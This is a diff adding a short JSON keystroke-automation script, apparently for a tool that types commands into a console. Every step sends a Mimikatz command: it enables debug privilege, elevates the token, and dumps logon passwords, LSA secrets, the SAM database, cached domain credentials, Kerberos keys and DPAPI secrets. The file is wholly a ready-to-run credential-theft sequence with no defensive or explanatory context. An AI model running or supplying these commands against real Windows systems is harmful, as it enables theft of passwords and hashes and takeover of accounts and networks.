@@ -1,0 +1,36 @@
+[
+	{"send-string":"privilege::debug"},
+	{"send-key":"Enter"},
+	{"sleep":"1"},
+	
+	{"send-string":"sekurlsa::dpapi"},
+	{"send-key":"Enter"},
+	{"sleep":"1"},
+
+	{"send-string":"token::elevate"},
+	{"send-key":"Enter"},
+	{"sleep":"1"},
+	
+	{"send-string":"sekurlsa::logonpasswords"},
+	{"send-key":"Enter"},
+	{"sleep":"1"},
+	
+	{"send-string":"lsadump::lsa /inject"},
+	{"send-key":"Enter"},
+	{"sleep":"1"},
+	
+	{"send-string":"lsadump::sam"},
+	{"send-key":"Enter"},
+	{"sleep":"1"},
+	
+	{"send-string":"lsadump::cache"},
+	{"send-key":"Enter"},
+	{"sleep":"1"},
+	
+	{"send-string":"sekurlsa::ekeys"},
+	{"send-key":"Enter"},
+	{"sleep":"1"},
+	
+	{"send-string":"exit"},
+	{"send-key":"Enter"}
+]
